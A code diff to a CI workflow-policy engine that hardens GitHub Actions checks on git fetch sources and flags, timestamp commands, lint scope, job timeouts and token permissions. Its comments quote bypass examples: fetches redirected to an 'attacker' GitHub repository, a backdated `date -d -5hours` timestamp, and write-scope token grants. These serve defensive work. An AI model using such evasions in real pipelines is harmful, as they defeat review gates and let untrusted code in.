@@ -179,6 +179,18 @@ const REQUIRED_TRIGGERS = ['pull_request', 'merge_group'];
 const GATE_JOB = 'gate';
 
 /**
+ * The largest `timeout-minutes` any job in this file may declare.
+ *
+ * The jobs here are 20 (`verify`), 20 (`e2e`), 30 (`deploy`) and 5 (`gate`), so
+ * this is roughly twice the slowest of them: enough for a cold pnpm store, a
+ * slow image build and a retried browser download on the same run, and not
+ * enough for a hang to matter. GitHub's own ceiling is 4320 minutes — three days
+ * — which is not a bound anybody would act on. Raising this is an edit here with
+ * a reason beside it; that visibility is the whole content of the rule.
+ */
+const MAX_JOB_TIMEOUT_MINUTES = 60;
+
+/**
  * Every rule this engine can emit, declared rather than counted by hand.
  *
  * Round 2 of this ticket claimed "15 rules" in a receipt while the engine
@@ -297,34 +309,125 @@ const MATCHERS = [];
  * release adds are one clause, not five.
  *
  * A flag goes on a list here when the workflow uses it, or when somebody argues
- * for it in the same commit that adds it. Values may be attached (`--depth=1`)
- * or separate; a separate value is a bare word and is not checked, because it
- * is data. Short flags are compared whole, so `-sKILL` is refused as a spelling
- * nobody justified — fail-closed, and stated rather than discovered.
+ * for it in the same commit that adds it. Short flags are compared whole, so
+ * `-sKILL` is refused as a spelling nobody justified — fail-closed, and stated
+ * rather than discovered.
+ *
+ * ── THE VALUE-VS-PRESENCE DEFECT, REPRODUCED INSIDE THIS FIX (#40 round 7) ──
+ * The paragraph above used to end: "Values may be attached (`--depth=1`) or
+ * separate; a separate value is a bare word and is not checked, because it is
+ * data." That sentence was measured wrong by a blind cross-lineage review, in
+ * the one entry it mattered for. `-c` was on `FETCHES_BASELINE`'s list by name,
+ * so its value was the unchecked bare word the comment describes, and
+ *
+ *     git -c url.https://github.com/attacker/.insteadOf=https://github.com/lmvdz/ \
+ *         fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main
+ *
+ * was **policy-clean** against the engine as committed: `origin` is named, the
+ * refspec is exact, every flag is on the list — and git rewrites the URL before
+ * it connects, so `origin/main` ends up pointing at a tree of the author's
+ * choosing and `assert-floor-ratchet.mjs` compares this pull request's floors
+ * against it. The reviewer's words: "that is the value-vs-presence defect
+ * reproduced inside your fix for the value-vs-presence defect". It is the same
+ * shape as `--fail-if-no-match=false` in the manager table and as
+ * `--disable-warning <script>` in the node-flag table, both of which had already
+ * been closed one table at a time — and this table was the one nobody swept.
+ *
+ * So the entry is the flag *with its arity and its admissible values*, in the
+ * polarity every other table in this file already uses. A spec is either
+ *
+ *   - a plain string, meaning the flag takes **no** value: written with an
+ *     attached `=value` it is refused, and a following word is an operand rather
+ *     than something the flag consumed; or
+ *   - `{flag, value: <RegExp>, separate: true?}`, meaning it may carry a value
+ *     the regexp accepts — attached (`--depth=1`) always, and as the next argv
+ *     word (`--depth 1`) only when `separate` says the flag is spelled that way.
+ *
+ * A separate value is *consumed*, so the operand scan below cannot mistake it
+ * for a positional — which is the other half of the same fix: `firstOperand` in
+ * `shell-command.mjs` does not know which flags take values and reads
+ * `git -c protocol.version=2 fetch` as a command whose first operand is
+ * `protocol.version=2`. That function is left alone and the operand scan is done
+ * here, where the arity is declared.
  */
+/**
+ * `[spec] → Map<flag, {value, separate}>`, so a list can be written readably and
+ * compared cheaply. Declared once and shared: a matcher that needs the operands
+ * as well as the verdict (`FETCHES_BASELINE`, `RUNS_ACTIONLINT`) builds its
+ * table from the same array it hands to `command()`, so the two can never
+ * disagree about which words were options.
+ */
+function flagTable(specs) {
+  const table = new Map();
+  for (const spec of specs) {
+    if (typeof spec === 'string') {
+      table.set(spec, { value: undefined, separate: false });
+      continue;
+    }
+    table.set(spec.flag, { value: spec.value, separate: spec.separate === true });
+  }
+  return table;
+}
+
+/**
+ * Walks one argv against a flag table, separating options from operands.
+ *
+ * @param {string[]} argv the command's words, `argv[0]` being the command itself
+ * @param {Map} flags a table from `flagTable()`
+ * @returns {{operands: string[]}|null} the positional words, in order, or `null`
+ *   when some option word is not one this invocation may carry — an unknown
+ *   flag, a value on a flag that takes none, a value the flag's regexp refuses,
+ *   or a value-taking flag written with a space when only the attached spelling
+ *   is admissible.
+ */
+function scanOptions(argv, flags) {
+  const words = argv ?? [];
+  const operands = [];
+  for (let index = 1; index < words.length; index += 1) {
+    const word = words[index];
+    if (!word.startsWith('-') || word === '-' || word === '--') {
+      operands.push(word);
+      continue;
+    }
+    const equals = word.indexOf('=');
+    const flag = equals === -1 ? word : word.slice(0, equals);
+    const spec = flags.get(flag);
+    if (spec === undefined) return null;
+    if (equals !== -1) {
+      // `--no-tags=whatever` on a switch is refused for the reason
+      // `--fail-if-no-match=false` is: the other position of a switch is the
+      // behaviour the entry was written to refuse.
+      if (spec.value === undefined) return null;
+      if (!spec.value.test(word.slice(equals + 1))) return null;
+      continue;
+    }
+    if (spec.value === undefined) continue;
+    if (!spec.separate) return null;
+    const next = words[index + 1];
+    if (next === undefined || !spec.value.test(next)) return null;
+    index += 1; // Consumed as this flag's value, and therefore not an operand.
+  }
+  return { operands };
+}
+
 class CommandMatcher {
   constructor(describes, names, match, flags) {
     this.describes = describes;
     this.names = names;
-    this.flags = flags;
+    this.flags = flagTable(flags);
     this.match = (command) => match(command) && this.optionsAllowed(command);
   }
 
   /**
-   * True when every option word in this argv is one this invocation may carry.
+   * True when every option word in this argv is one this invocation may carry,
+   * with a value this invocation may give it.
    *
    * `argv`, not `raw`: the launcher's own options are governed by
    * `PROTECTED_STEP_LAUNCHERS`, and asking this about them would refuse
    * `timeout -s TERM 30 git fetch …` for a flag that belongs to `timeout`.
    */
   optionsAllowed({ argv }) {
-    for (const word of (argv ?? []).slice(1)) {
-      if (!word.startsWith('-') || word === '-' || word === '--') continue;
-      const equals = word.indexOf('=');
-      const flag = equals === -1 ? word : word.slice(0, equals);
-      if (!this.flags.has(flag)) return false;
-    }
-    return true;
+    return scanOptions(argv, this.flags) !== null;
   }
 
   /** True when some simple command in `script` runs this, and completes. */
@@ -342,15 +445,36 @@ class CommandMatcher {
  * @param {string} describes what a human should read in a violation message
  * @param {string[]} names the command words this recognition depends on
  * @param {(command: object) => boolean} match predicate over one simple command
- * @param {string[]} [flags] the options this invocation may carry; the default
- *   is none at all, which is the allowlist working — a matcher that needs one
- *   says so, and every flag nobody has named reads as "not this command"
+ * @param {(string|{flag: string, value: RegExp, separate?: boolean})[]} [flags]
+ *   the options this invocation may carry, and the values each may carry; the
+ *   default is none at all, which is the allowlist working — a matcher that
+ *   needs one says so, and every flag nobody has named reads as "not this
+ *   command". A bare string is a flag that takes no value at all.
  */
 function command(describes, names, match, flags = []) {
-  const matcher = new CommandMatcher(describes, names, match, new Set(flags));
+  const matcher = new CommandMatcher(describes, names, match, flags);
   MATCHERS.push(matcher);
   return matcher;
 }
+
+/**
+ * The node flags a recognised `node <script>` may carry, as option specs.
+ *
+ * Derived from `NODE_FLAGS_ALLOWED` rather than written out again, because that
+ * table is what `runsItsScript` reads and two tables describing one option's
+ * arity is the defect this whole ticket is about — it is how
+ * `pnpm --fail-if-no-match false …` walked past the pairing rule. `separate` is
+ * deliberately absent, i.e. false, for the same reason `runsItsScript` refuses
+ * the spaced spelling: `node --disable-warning scripts/ci/assert-x.mjs` makes
+ * node swallow the script path as the flag's value, run nothing, and exit 0.
+ * The value pattern is `\S+` because these values are diagnostics data — a
+ * warning name, a byte count — and nothing here claims otherwise; what makes
+ * that admissible is that none of them can load code or change the exit status,
+ * which is the entry criterion stated on `NODE_FLAGS_ALLOWED` itself.
+ */
+const NODE_FLAG_SPECS = [...NODE_FLAGS_ALLOWED].map(([flag, { takesValue }]) =>
+  takesValue ? { flag, value: /^\S+$/ } : flag,
+);
 
 /**
  * A script being *invoked* under `node`, not merely mentioned.
@@ -376,10 +500,10 @@ function invokesIn(directory, script) {
       return operand !== undefined && path.test(operand);
     },
     // `runsItsScript` already governs which node flags are admissible and why —
-    // this is the same set, handed to the option gate so the two cannot
-    // disagree. A node flag nobody justified reads as "not this invocation"
-    // from both directions.
-    [...NODE_FLAGS_ALLOWED.keys()],
+    // this is the same set, with the same arity, handed to the option gate so
+    // the two cannot disagree. A node flag nobody justified reads as "not this
+    // invocation" from both directions.
+    NODE_FLAG_SPECS,
   );
 }
 
@@ -425,7 +549,7 @@ const CHECKS_ALL_WORKFLOWS = command(
     const operand = firstOperand(argv, argv.indexOf(script) + 1);
     return operand === WORKFLOW_DIRECTORY || operand === `${WORKFLOW_DIRECTORY}/`;
   },
-  [...NODE_FLAGS_ALLOWED.keys()],
+  NODE_FLAG_SPECS,
 );
 
 /**
@@ -505,12 +629,54 @@ const JOB_ENV_FILE = new Set(['$GITHUB_ENV', '${GITHUB_ENV}']);
  */
 // The path prefix is not decoration: `$(/usr/bin/date +%s%3N)` is a legitimate
 // hardening spelling and the first version of this regex refused it, which a
-// blind review measured as a false red. And note what this rule does *not*
-// claim — `date --date=@1748736000 +%s%3N` reads a clock and satisfies it. That
-// value is refused by `report-file.mjs`, which requires the timestamp to be
-// within a day of now, so a literal stops working a day after it is written.
-// Neither half is sufficient; that is the point of there being two.
-const COMPUTED_BY_DATE = /(?:\$\(|`)\s*(?:[^\s()`]*\/)?date\b/;
+// blind review measured as a false red.
+//
+// ── THE CLOCK THAT CAN BE TOLD WHAT TIME IT IS (#40 round 7) ────────────────
+// Round 6 required only that the value come from a *command called `date`*, and
+// wrote down, as a stated boundary, that `date --date=@1748736000 +%s%3N` reads
+// a clock and satisfies it — the argument being that `report-file.mjs` refuses a
+// timestamp that is not within a day of now, so a literal stops working a day
+// after it is written. That argument is true of a *literal* and false of the
+// thing an author would actually write. Measured against the engine as
+// committed:
+//
+//     run: echo "VITEST_RUN_START=$(date -d -5hours +%s%3N)" >> "$GITHUB_ENV"
+//
+// is policy-clean, and it is a *relative* offset — it is within a day of now on
+// every run, for ever, so `report-file.mjs`'s plausibility window admits it, and
+// its 6h `MAX_RUN_AGE_MS` admits it too. What it defeats is the freshness
+// comparison the pair exists for: a `vitest-report.json` left on disk two hours
+// before the suite started now post-dates the recorded start, so a report of a
+// run that never happened is certified fresh. The honest value reports "is
+// stale: last written 7200s before vitest started"; the backdated one reports no
+// problems at all. Two halves, and one line satisfied both.
+//
+// So the whole argv is the entry, not the command word: `date` and `+%s%3N`,
+// with an optional absolute path to the binary, and nothing else. `-d`,
+// `--date`, `-r`, `--reference`, `-u`, and the flag the next coreutils release
+// adds are one clause rather than five, in the polarity every other table in
+// this file has been inverted into.
+//
+// What this does *not* claim, because the rule is a matcher and matchers answer
+// about one command: it governs the step that *satisfies the prerequisite*, not
+// every write of that name. A second step between the suite and the report gate
+// writing `VITEST_RUN_START=$(date -d -5hours +%s%3N) >> "$GITHUB_ENV"` sets the
+// variable the gate actually reads, and nothing here refuses it — the name is
+// declared, the writer is `echo`, and `required-step-prerequisites` is already
+// satisfied by the honest step further up. The same was true of round 6 and of
+// `VITEST_RUN_START=0`; it is recorded here rather than left to be discovered,
+// and closing it means a rule about how many times a job may write one variable.
+/** Every `$( … )` or backtick substitution in one word, innermost text only. */
+const SUBSTITUTION = /\$\(([^()]*)\)|`([^`]*)`/g;
+/** The one command a run-start timestamp may be read from, whole. */
+const CLOCK_READ = /^(?:[^\s()`]*\/)?date\s+\+%s%3N$/;
+
+/** The text inside every command substitution in `word`, trimmed. */
+function substitutions(word) {
+  return [...String(word).matchAll(SUBSTITUTION)].map((found) =>
+    (found[1] ?? found[2] ?? '').trim(),
+  );
+}
 
 function exportsToJobEnv(name) {
   return command(
@@ -521,7 +687,14 @@ function exportsToJobEnv(name) {
       if (!(firstOperand(argv) ?? '').startsWith(`${name}=`)) return false;
       // Any operand, not only the first: `printf "NAME=%s\n" "$(date +%s%3N)"`
       // is the same claim spelled with the value in the second word.
-      if (!argv.slice(1).some((word) => COMPUTED_BY_DATE.test(word))) return false;
+      const read = argv.slice(1).flatMap(substitutions);
+      // At least one — a constant is not a timestamp (`VITEST_RUN_START=0` makes
+      // `mtime + 1000 < 0` false for every file that has ever existed) — and
+      // *every* one, because `$(date +%s%3N)$(something-else)` is one word with
+      // two commands in it and only the allowlist polarity refuses the second
+      // without having heard of it. A nested substitution this regexp cannot
+      // read matches nothing, so it fails closed here too.
+      if (read.length === 0 || !read.every((one) => CLOCK_READ.test(one))) return false;
       return redirections.some(
         ({ op, target }) =>
           (op === '>>' || op === '>') && target.expandable && JOB_ENV_FILE.has(target.value),
@@ -580,18 +753,47 @@ function exportsToJobEnv(name) {
  * the schema assertion. One matcher per command means the two rules can never
  * drift into disagreeing about what "the migrations ran" means.
  */
+/**
+ * `-color` and `--color` are switches: they choose whether the output is
+ * escaped, and nothing about what is linted.
+ */
+// `-version` prints a banner and lints nothing, and it satisfied the `-color`
+// test happily: `actionlint -color -version` was clean.
+const ACTIONLINT_FLAGS = ['-color', '--color'];
+const ACTIONLINT_FLAG_TABLE = flagTable(ACTIONLINT_FLAGS);
+
+/**
+ * ── THE OPERAND NOBODY LOOKED AT (#40 round 7) ──────────────────────────────
+ * This rule checked the command word and the presence of `-color`, and stopped.
+ * `actionlint` with no file operands lints *every* workflow it finds in the
+ * repository; given one it lints exactly that one. So
+ *
+ *     run: '"$RUNNER_TEMP/actionlint" -color .github/workflows/ci.yml'
+ *
+ * was policy-clean against the engine as committed, with a second workflow file
+ * — `.github/workflows/x.yaml`, say — never linted at all. That is the identical
+ * defect `CHECKS_ALL_WORKFLOWS` three declarations below exists for, in the step
+ * immediately above it: round 6 pinned this engine's own argument to the
+ * workflow *directory* and left the linter beside it pointed at whatever the
+ * author felt like naming. Until now it was caught only *incidentally* — the
+ * self-test pins that `run:` line verbatim in a `replaceOnce` — which is an
+ * alarm on one spelling rather than a rule about the class.
+ *
+ * So: zero positional operands, options only. The step in ci.yml already reads
+ * `'"$RUNNER_TEMP/actionlint" -color'`, so nothing in the workflow moves; what
+ * changes is that adding an operand is now a red build instead of a quiet
+ * narrowing of what gets linted.
+ */
 const RUNS_ACTIONLINT = command(
-  '`actionlint -color`',
+  '`actionlint -color`, with no file operands so it lints every workflow',
   ['actionlint'],
   ({ argv }) => {
-    return (
-      basename(argv[0]) === 'actionlint' &&
-      argv.slice(1).some((word) => word === '-color' || word === '--color')
-    );
+    if (basename(argv[0]) !== 'actionlint') return false;
+    const scan = scanOptions(argv, ACTIONLINT_FLAG_TABLE);
+    if (scan === null || scan.operands.length > 0) return false;
+    return argv.slice(1).some((word) => word === '-color' || word === '--color');
   },
-  // `-version` prints a banner and lints nothing, and it satisfied the `-color`
-  // test happily: `actionlint -color -version` was clean.
-  ['-color', '--color'],
+  ACTIONLINT_FLAGS,
 );
 const RUNS_LINT = packageScript('lint');
 const RUNS_TYPECHECK = packageScript('typecheck');
@@ -600,13 +802,29 @@ const WAITS_FOR_POSTGRES = invokes('wait-for-postgres\\.mjs');
 const RUNS_MIGRATIONS = binary('drizzle-kit', [], 'migrate');
 // `-t nomatch_xyz` runs zero tests and exits 0, and the report gate reads a
 // report of a run that matched nothing. Same class as `--dry-run`.
-const RUNS_VITEST = binary('vitest', ['--reporter', '--outputFile.json'], 'run');
+//
+// Both of these carry a value and the value is genuinely data — a reporter name
+// or a path to one, and the file the json reporter writes. Written attached, the
+// spelling the workflow uses; the spaced form is refused rather than consumed,
+// because a flag whose value this table does not read is a flag that can eat the
+// word after it (`node --disable-warning <script>`, measured in
+// `NODE_FLAGS_ALLOWED`). What the *values* are is not claimed here and does not
+// need to be: `assert-vitest-report.mjs` reads `vitest-report.json` at a fixed
+// path and fails when it is absent or stale, which is the runtime half.
+const RUNS_VITEST = binary(
+  'vitest',
+  [
+    { flag: '--reporter', value: /^\S+$/ },
+    { flag: '--outputFile.json', value: /^\S+$/ },
+  ],
+  'run',
+);
 const INSTALLS_CHROMIUM = binary('playwright', ['--with-deps'], 'install');
 const MIGRATES_E2E_DATABASE = invokesIn(String.raw`e2e\/support`, String.raw`ensure-database\.mjs`);
 const ASSERTS_CHROMIUM = invokes('assert-chromium\\.mjs');
 // `--list` prints the tests and runs none of them; `-g`/`--grep` runs the ones
 // that match a pattern, which may be none.
-const RUNS_PLAYWRIGHT = binary('playwright', ['--reporter'], 'test');
+const RUNS_PLAYWRIGHT = binary('playwright', [{ flag: '--reporter', value: /^\S+$/ }], 'test');
 
 /**
  * The `deploy` job's four compose verbs (#40).
@@ -643,7 +861,7 @@ function composeStack(verb) {
       if (script === undefined || !path.test(script)) return false;
       return firstOperand(argv, argv.indexOf(script) + 1) === verb;
     },
-    [...NODE_FLAGS_ALLOWED.keys()],
+    NODE_FLAG_SPECS,
   );
 }
 
@@ -701,16 +919,101 @@ const DELETES_E2E_REPORT = {
  */
 const BASELINE_REFSPEC = /^\+?refs\/heads\/main:refs\/remotes\/origin\/main$/;
 
+/**
+ * The remote half, which round 6 pinned the destination of and not the source of.
+ *
+ * ── THE DEFECT (#40 round 7) ────────────────────────────────────────────────
+ * `git fetch`'s positional operands are `<remote> <refspec>…`, and this matcher
+ * read the refspec and never the remote. Measured against the engine as
+ * committed:
+ *
+ *     run: git fetch --no-tags --depth=1 https://github.com/attacker/atrium \
+ *          +refs/heads/main:refs/remotes/origin/main
+ *
+ * is **policy-clean**. `origin/main` then resolves — it resolves to a tree of
+ * the author's choosing — so `assert-floor-ratchet.mjs`'s "fatal on an
+ * unresolvable ref" check is satisfied and every floor in this pull request is
+ * compared against a baseline somebody else wrote. Round 6 closed "the refspec
+ * names a ref nobody reads" and left "the ref is filled from a repository nobody
+ * named", which is the same sentence with the operands swapped.
+ *
+ * So the remote is the word `origin` and nothing else, and no operand may look
+ * like a location at all — a URL, an scp-style `user@host:path`, an absolute or
+ * relative path, or a `.git` directory. `origin` is what `actions/checkout`
+ * configures and what the ratchet reads back; a fetch that names its source
+ * inline is a fetch this repository has no reason to write.
+ *
+ * ── WHERE THIS STOPS, STATED RATHER THAN CHASED ─────────────────────────────
+ * `origin` is a *name*, and this rule pins the words of one command. An earlier
+ * step of the same job running `git remote set-url origin https://…` or
+ * `git config remote.origin.url …` re-points it, and neither is a construct any
+ * rule in this file refuses today: `no-command-shadowing` bans redefinitions of
+ * the *command word* `git`, not things git is asked to do. The `-c` clause above
+ * closes the per-invocation spelling because that one rides on the very command
+ * this matcher reads; the separate-step spelling is a second command and is
+ * outside what a matcher over one argv can see. Closing it means a rule about
+ * what a job may do to its git configuration, which is a new prohibition with no
+ * measured defect behind it yet — so it is written down here rather than guessed
+ * at, in the same voice as the composite-action gap at the top of this file.
+ */
+const BASELINE_REMOTE = 'origin';
+/** A word that names a repository somewhere rather than a configured remote. */
+const LOOKS_LIKE_A_LOCATION = /:\/\/|^[./~]|^[^/]*@|\.git$/;
+
+/**
+ * The flags the baseline fetch may carry — with the values each of them may
+ * carry, which is the half that was missing.
+ *
+ * `--dry-run` is the one that matters most in this file: it keeps every word
+ * this matcher reads and updates no ref, so `origin/main` never materialises and
+ * the ratchet takes its no-baseline exit-0 path — the ticket's founding defect,
+ * wearing a flag, policy-clean until this list existed. It is refused by not
+ * being here.
+ *
+ * `-c` is the one that mattered most in round 7. It stays, because
+ * `git -c protocol.version=2 fetch …` is a legitimate hardening spelling with an
+ * ACCEPTED_FORMS fixture — nothing in ci.yml writes it today, and an allowlist
+ * entry nobody exercises is an attack surface nobody tests, so the fixture is
+ * what earns it its place rather than the workflow. What is refused is every
+ * other config assignment, and the reason is one line long:
+ * `-c url.<attacker>.insteadOf=<real>` makes git rewrite the URL before it
+ * connects, so a fetch that names `origin` and the exact refspec still ends up
+ * with `origin/main` pointing at a tree of the author's choosing. `http.proxy`,
+ * `core.gitProxy`, `remote.origin.url` and the next transport knob are all
+ * refused by the same clause, without this file having heard of them.
+ *
+ * `--depth` takes a count, and both spellings are real: `--depth=1` is what the
+ * workflow writes and `--depth 1` is the same command. The separate form is
+ * *consumed* here, so `1` is not mistaken for the remote operand below.
+ */
+const FETCH_FLAGS = [
+  '--no-tags',
+  { flag: '--depth', value: /^[0-9]+$/, separate: true },
+  { flag: '-c', value: /^protocol\.version=[0-9]+$/, separate: true },
+];
+const FETCH_FLAG_TABLE = flagTable(FETCH_FLAGS);
+
 const FETCHES_BASELINE = {
   what: 'the fetch of the baseline manifest from main',
   test: command(
-    '`git fetch … +refs/heads/main:refs/remotes/origin/main`',
+    '`git fetch … origin +refs/heads/main:refs/remotes/origin/main`',
     ['git'],
     ({ argv }) => {
       if (basename(argv[0]) !== 'git') return false;
-      // The subcommand by membership rather than by position: `git -c x=y fetch`
-      // is a fetch, and reading the first operand would call it a `x=y`.
-      if (!argv.slice(1).includes('fetch')) return false;
+      // The operands, with every flag's value consumed by the table above.
+      // `firstOperand` in shell-command.mjs cannot do this — it does not know
+      // which flags take a value, so it reads `git -c protocol.version=2 fetch`
+      // as a command whose first operand is `protocol.version=2` — and that
+      // function is deliberately left alone: the arity is declared here, so the
+      // scan belongs here too.
+      const scan = scanOptions(argv, FETCH_FLAG_TABLE);
+      if (scan === null) return false;
+      const [subcommand, remote, ...refspecs] = scan.operands;
+      // The subcommand as the *first* operand rather than by membership: round 6
+      // used `includes('fetch')`, which a `-c` value spelling the word satisfies.
+      if (subcommand !== 'fetch') return false;
+      if (remote !== BASELINE_REMOTE) return false;
+      if (scan.operands.some((word) => LOOKS_LIKE_A_LOCATION.test(word))) return false;
       // The whole refspec, as one word, and not merely a word that *contains*
       // `refs/heads/main`. Round 5 asked for the substring, which accepts
       // `+refs/heads/main:refs/remotes/origin/mainx` — a fetch that updates a
@@ -722,15 +1025,9 @@ const FETCHES_BASELINE = {
       // was real and held shut by git's behaviour. One `git config --unset` in an
       // earlier step, or a checkout action that stops adding the remote, and it
       // opens. Rules do not get to rely on that.
-      return argv.slice(1).some((word) => BASELINE_REFSPEC.test(word));
+      return refspecs.some((word) => BASELINE_REFSPEC.test(word));
     },
-    // The one that matters most in this file. `git fetch --dry-run …` keeps
-    // every word this matcher reads and updates no ref, so `origin/main` never
-    // materialises and the ratchet takes its no-baseline exit-0 path — the
-    // ticket's founding defect, wearing a flag, policy-clean until this list
-    // existed. `-c` is here because `git -c protocol.version=2 fetch …` is an
-    // accepted form; its value is a bare word and is not an option.
-    ['--no-tags', '--depth', '-c'],
+    FETCH_FLAGS,
   ),
   because:
     'without it the shallow clone actions/checkout leaves has no `origin/main`, so the ratchet finds no baseline, reports that politely, and exits 0 — a floor lowered in the same pull request would sail through the very gate that exists to catch it',
@@ -2064,6 +2361,81 @@ function pathString(path, key) {
   return [...path, key].join('.');
 }
 
+/**
+ * The `GITHUB_TOKEN` scopes a job in this repository may hold, as an allowlist.
+ *
+ * ── THE DEFECT (#40 round 7) ────────────────────────────────────────────────
+ * `least-privilege` read `workflow.permissions.contents === 'read'` and stopped.
+ * In GitHub Actions a job-level `permissions:` block **replaces** the workflow
+ * default entirely rather than narrowing it, so
+ *
+ *     deploy:
+ *       permissions: { contents: write, packages: write }
+ *
+ * was policy-clean against the engine as committed — `node
+ * scripts/ci/workflow-policy.mjs .github/workflows` exited 0 and all 182
+ * self-test mutations still passed — while the job that builds and runs
+ * container images held a token that can push to this repository and to its
+ * package registry. The rule's own sentence, "so a job inherits nothing it did
+ * not ask for", was unenforced at exactly the level where the asking happens.
+ *
+ * ── WHY AN ALLOWLIST, NOT A LIST OF BAD SCOPES ──────────────────────────────
+ * The same argument as `DECLARED_VARIABLES`, `NODE_FLAGS_ALLOWED` and the
+ * launcher table before it: GitHub adds permission scopes, and a denylist of the
+ * dangerous ones is a list that is complete until the next release note.
+ * `attestations`, `models` and `id-token` all arrived after this file was first
+ * written. So: every value must be `read` or `none`, and the only scope that may
+ * be granted `read` is `contents` — everything this repository's CI does is read
+ * its own source. A job may also omit `permissions:` entirely and inherit the
+ * workflow default, which this file pins to `contents: read`.
+ *
+ * The string forms are refused outright. `permissions: write-all` grants write
+ * on every scope; `permissions: read-all` grants read on scopes this workflow
+ * never reads (`actions`, `packages`, `id-token`) and cannot be narrowed,
+ * because the string form has no room to say `contents` and only `contents`.
+ * `permissions: {}` is admissible and means the opposite — no scopes at all —
+ * which is why the check is over the entries rather than over the key.
+ *
+ * What this does *not* claim: a token's scopes are not the only reach a job has.
+ * A step can carry its own credentials in `secrets`, and `deploy` runs container
+ * images that talk to the network. This rule bounds the ambient
+ * `GITHUB_TOKEN`, which is the thing GitHub hands every job whether it asked or
+ * not, and says nothing about the rest.
+ *
+ * @param {unknown} value the `permissions:` value, from any level
+ * @returns {string[]} problems, each a sentence beginning mid-line
+ */
+const PERMISSION_VALUES = new Set(['read', 'none']);
+const READABLE_SCOPE = 'contents';
+
+function permissionProblems(value) {
+  if (typeof value === 'string') {
+    return [
+      `is the string form \`permissions: ${value}\`, which sets every scope at once: \`write-all\` grants write on all of them and \`read-all\` grants read on scopes this workflow never reads. Write the mapping out — \`contents: read\`, and nothing else.`,
+    ];
+  }
+  if (!isPlainObject(value)) {
+    return [
+      `is \`${JSON.stringify(value) ?? String(value)}\`, which is neither the mapping form nor a value this rule knows how to read. An unrecognised shape is refused rather than skipped: a \`permissions:\` key whose value nothing here understands is a token grant nothing here has bounded.`,
+    ];
+  }
+  const problems = [];
+  for (const [scope, granted] of Object.entries(value)) {
+    if (!PERMISSION_VALUES.has(granted)) {
+      problems.push(
+        `grants \`${scope}: ${granted}\`, and every scope in this workflow must be \`read\` or \`none\`. Nothing this repository's CI does writes through the \`GITHUB_TOKEN\`: it reads its own source, runs its own tests, and reports through the check that needed it.`,
+      );
+      continue;
+    }
+    if (granted === 'read' && scope !== READABLE_SCOPE) {
+      problems.push(
+        `grants \`${scope}: read\`, and \`${READABLE_SCOPE}\` is the only scope this workflow reads. This is an allowlist rather than a list of scopes somebody decided were dangerous, because GitHub keeps adding scopes — \`attestations\`, \`models\` and \`id-token\` all postdate the first version of this rule — and a denylist is complete until the next release note.`,
+      );
+    }
+  }
+  return problems;
+}
+
 /** `always()`, `${{ always() }}`, `${{always()}}` all mean the same thing. */
 function normalizeCondition(value) {
   return String(value)
@@ -2227,11 +2599,29 @@ export function checkWorkflow(source, path = '<workflow>') {
   }
 
   // ---- permissions -------------------------------------------------------
+  //
+  // The workflow-level block is the *default*, and a job-level block replaces it
+  // wholesale — see `permissionProblems` for the measurement. Both are checked
+  // against the same allowlist; only this one is additionally required to exist
+  // and to say `contents: read`, because a workflow with no `permissions:` at
+  // all inherits whatever the repository's default is, which is not a property of
+  // this file.
   if (!isPlainObject(workflow.permissions) || workflow.permissions.contents !== 'read') {
     add(
       'least-privilege',
-      `${path}: workflow-level \`permissions:\` must declare \`contents: read\` so a job inherits nothing it did not ask for.`,
+      `${path}: workflow-level \`permissions:\` must declare \`contents: read\` so a job inherits nothing it did not ask for.${
+        typeof workflow.permissions === 'string'
+          ? ` \`permissions: ${workflow.permissions}\` is the string form, which sets every scope at once and cannot say \`contents\` and only \`contents\`.`
+          : ''
+      }`,
     );
+  } else {
+    for (const problem of permissionProblems(workflow.permissions)) {
+      add(
+        'least-privilege',
+        `${path}: workflow-level \`permissions:\` ${problem} This is the default every job in the file inherits, so a scope granted here is a scope granted to all of them.`,
+      );
+    }
   }
 
   // ---- actions are pinned to commit SHAs ---------------------------------
@@ -2310,10 +2700,41 @@ export function checkWorkflow(source, path = '<workflow>') {
   // ---- every job is bounded, and defined here -----------------------------
   for (const [jobId, job] of Object.entries(jobs)) {
     if (!isPlainObject(job)) continue;
-    if (typeof job['timeout-minutes'] !== 'number') {
+    // A job-level `permissions:` block replaces the workflow default rather than
+    // narrowing it, so the workflow-level check above says nothing at all about
+    // a job that declares its own. See `permissionProblems`: `permissions:
+    // {contents: write, packages: write}` on `deploy` was policy-clean.
+    if (Object.hasOwn(job, 'permissions')) {
+      for (const problem of permissionProblems(job.permissions)) {
+        add(
+          'least-privilege',
+          `${path}: job \`${jobId}\` declares \`permissions:\` that ${problem} A job-level block *replaces* the workflow default rather than narrowing it, so \`contents: read\` at the top of this file constrains nothing here. Delete the block and inherit the default, or write one this rule can read.`,
+        );
+      }
+    }
+    const minutes = job['timeout-minutes'];
+    if (typeof minutes !== 'number') {
       add(
         'job-timeout-required',
         `${path}: job \`${jobId}\` has no \`timeout-minutes\`. A job that can hang forever is a check that never reports.`,
+      );
+    } else if (!Number.isInteger(minutes) || minutes < 1 || minutes > MAX_JOB_TIMEOUT_MINUTES) {
+      // ── A NUMBER IS PRESENT, A BOUND IS NOT (#40 round 7) ────────────────
+      // The check above was `typeof … !== 'number'`, so `timeout-minutes: 4320`
+      // — three days, GitHub's own maximum for a job — satisfied it, and so did
+      // `0` and `-1`. "A job that can hang forever is a check that never
+      // reports" is the sentence this rule is written under, and a job that
+      // hangs for three days is that sentence with a receipt at the end of it:
+      // the merge queue is blocked, the runner minutes are spent, and nobody
+      // waits three days to find out. The ceiling is a real bound or it is a
+      // type check wearing a bound's name.
+      add(
+        'job-timeout-required',
+        `${path}: job \`${jobId}\` declares \`timeout-minutes: ${minutes}\`, which is not a whole number of minutes between 1 and ${MAX_JOB_TIMEOUT_MINUTES}. ${
+          minutes > MAX_JOB_TIMEOUT_MINUTES
+            ? `The three jobs in this file take 20, 20 and 30 minutes and the gate takes 5, so ${MAX_JOB_TIMEOUT_MINUTES} is roughly twice the slowest of them — room for a bad day on a cold cache, and nowhere near GitHub's own 4320-minute maximum, which is three days of a blocked merge queue nobody is going to wait out. Raising the ceiling is an edit to this file with a reason beside it, which is the point.`
+            : 'A timeout must be a positive whole number of minutes: `0` and negatives are not "no limit", they are a bound nobody can act on, and a fractional value is a spelling GitHub does not document.'
+        }`,
       );
     }
     // A reusable workflow moves the job body somewhere this engine cannot read
